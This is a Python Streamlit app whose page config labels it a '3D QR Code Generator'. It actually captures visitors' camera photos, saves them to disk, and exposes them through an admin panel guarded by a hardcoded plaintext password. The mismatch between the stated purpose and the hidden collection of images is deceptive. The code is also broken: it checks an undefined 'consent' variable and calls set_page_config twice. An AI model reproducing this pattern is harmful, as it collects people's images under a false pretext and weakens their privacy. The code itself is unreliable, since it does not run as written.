# app.py
import streamlit as st
import os
import io
from datetime import datetime
from PIL import Image

st.set_page_config(
    page_title="3D QR Code Generator | Major Project",
    page_icon="✨",
    layout="centered"
)


st.markdown("""
    <style>
        body {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
        }
        .main {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0px 10px 25px rgba(0,0,0,0.4);
        }
        h1, h2, h3, h4 {
            color: #ffdd59;
            text-align: center;
        }
        .card {
            background: rgba(255,255,255,0.15);
            padding: 20px;
            margin: 10px 0;
            border-radius: 15px;
            box-shadow: 0px 6px 15px rgba(0,0,0,0.3);
        }
        .stTextInput, .stSelectbox, .stButton>button, .stDownloadButton>button {
            border-radius: 12px;
            border: none;
            padding: 10px 15px;
            font-size: 16px;
            box-shadow: 0px 4px 12px rgba(0,0,0,0.25);
        }
        .stButton>button {
            background: linear-gradient(135deg, #00ff99, #00ccff);
            color: black;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        .stButton>button:hover {
            transform: scale(1.07);
            box-shadow: 0px 6px 20px rgba(0,0,0,0.6);
        }
        .stDownloadButton>button {
            background: linear-gradient(135deg, #ff9966, #ff5e62);
            color: white;
            font-weight: bold;
        }
        footer {
            text-align: center;
            margin-top: 40px;
            color: #ddd;
            font-size: 14px;
        }
        .brand {
    color: #FF0000;
    font-weight: bold;
    animation: glow 1.5s ease-in-out infinite alternate;
}

@keyframes glow {
    from { text-shadow: 0 0 5px #FF0000, 0 0 10px #FF0000; }
    to { text-shadow: 0 0 20px #FF0000, 0 0 30px #FF0000; }
}


    </style>
""", unsafe_allow_html=True)


# --- Configuration ---
UPLOAD_DIR = "uploads"
ADMIN_PASSWORD = "purwxnsh"  # change this before running

os.makedirs(UPLOAD_DIR, exist_ok=True)

st.set_page_config(page_title="Photobooth", layout="centered")

st.title("📷 Photobooth")

# Camera input (works on mobile and desktop browsers)
photo = st.camera_input("Press Here")

if photo is not None:
    # Show the preview to the user
    st.subheader("Preview")
    st.image(photo)

    if not consent:
        st.warning("Try Again.")
    else:
        # Save the image bytes to uploads folder with a timestamp
        image_bytes = photo.getvalue()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{timestamp}.png"
        filepath = os.path.join(UPLOAD_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(image_bytes)

        st.success("Chalo Bhaago Abb")
        # Optionally show a small confirmation that the operator can view it
        st.info("😁")

st.markdown("---")
st.write("**Admin Panel (Password required)**")
pw = st.text_input("Admin password", type="password")
if pw:
    if pw == ADMIN_PASSWORD:
        st.success("Admin authenticated.")
        # List saved photos
        files = sorted(os.listdir(UPLOAD_DIR), reverse=True)
        if not files:
            st.info("No photos uploaded yet.")
        else:
            st.write(f"Found {len(files)} saved photo(s).")
            for fname in files:
                path = os.path.join(UPLOAD_DIR, fname)
                try:
                    img = Image.open(path)
                    st.image(img, width=300, caption=fname)
                    with open(path, "rb") as f:
                        btn = st.download_button(
                            label=f"Download {fname}",
                            data=f,
                            file_name=fname,
                            mime="image/png",
                        )
                except Exception as e:
                    st.error(f"Could not open {fname}: {e}")
    else:
        st.error("Incorrect admin password.")

st.markdown("<footer>© 2025 PHOTOBOOTH PROJECT | <span class='brand'>Design by PURWANSH CHAUDAHRY</span> | Made with ❤️ in Python & Streamlit</footer>", unsafe_allow_html=True)

